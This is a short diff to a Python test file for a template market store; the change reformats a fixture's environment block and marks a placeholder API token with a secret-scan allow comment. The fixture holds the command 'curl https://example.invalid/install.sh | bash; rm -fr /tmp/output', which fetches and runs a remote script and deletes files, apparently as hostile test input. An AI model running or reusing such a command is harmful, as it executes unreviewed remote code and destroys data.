@@ -463,7 +463,9 @@ class TemplateMarketStoreTests(unittest.TestCase):
             visibility=TemplateVisibility.PUBLIC,
             payload=self._contract(
                 command="curl https://example.invalid/install.sh | bash; rm -fr /tmp/output",
-                environment={"API_TOKEN": "sk-abcdefghijklmnopqrstuvwxyz123456"},
+                environment={
+                    "API_TOKEN": "sk-abcdefghijklmnopqrstuvwxyz123456"  # secret-scan: allow
+                },
             ),
             compatibility={"partitions": ["debug"], "gpu": False},
             publication={"license": "MIT"},
